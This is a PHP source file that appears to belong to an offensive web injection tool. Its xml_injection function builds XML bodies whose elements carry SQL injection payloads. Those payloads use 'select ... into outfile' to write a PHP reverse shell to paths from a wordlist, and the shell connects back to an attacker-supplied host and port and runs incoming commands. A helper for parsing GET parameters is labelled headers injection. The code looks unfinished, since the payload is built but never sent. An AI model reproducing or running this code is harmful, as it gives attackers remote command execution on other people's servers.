<?php
function xml_injection($file){
  global $wordlist,$lhost,$lport;
  
  $xmlbody=<<<XML
  <?xml version="1.0" encoding="ascii"?>
  XML;
  global $wordlist,$lhost,$lport;
  $browser=new DOMDocument();
  $browser->loadXML($file);
  $parentnode=$browser->doctype->nodeName;
  echo "[-] Inintializing node names ...\n";
  $childnodes=array();
  $newchild=$browser->createElement("test","blablabla");
  foreach($browser->getElementsByTagName("*") as $node){ 
     array_push($childnodes,$node->nodeName);
     echo $node->nodeName."\n";
     echo $browser->getElementsByTagName($node->nodeName)->length."\n";
    }
    //print_r($childnodes);
    $xmlpayload=<<<XML
    <?xml version="1.0" encoding="ascii"?>
    <!DOCTYPE $parentnode [
    XML;
    foreach($childnodes as $child){
           $xmlpayload.="\n<!ELEMENT $child ANY>\n";
    }
    $xmlpayload.="]>";
    $xmlpayload.="<$parentnode>";
    $xmlpayload1=$xmlpayload;
    foreach($wordlist as $p){
      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
      foreach($cmd as $c){
    foreach($childnodes as $childnode){
      if ($childnode !==$parentnode){
      $xmlpayload.="<$childnode>$c</$childnode>";
    }}
    $xmlpayload.="</$parentnode>";
    //echo "\n$xmlpayload";
    
    $xmlpayload=$xmlpayload1;
  }}}
           /// HEADERS INJECTION
function fetch_parameters($method,$line,$default="null"){
if ($method=="GET"){
  return explode("=",explode("?",str_replace(' HTTP/1.1',"",str_replace("GET ","",$line)))[1])[0];
}else{
  return explode("\n\n",$default)[1];
}
}
?>
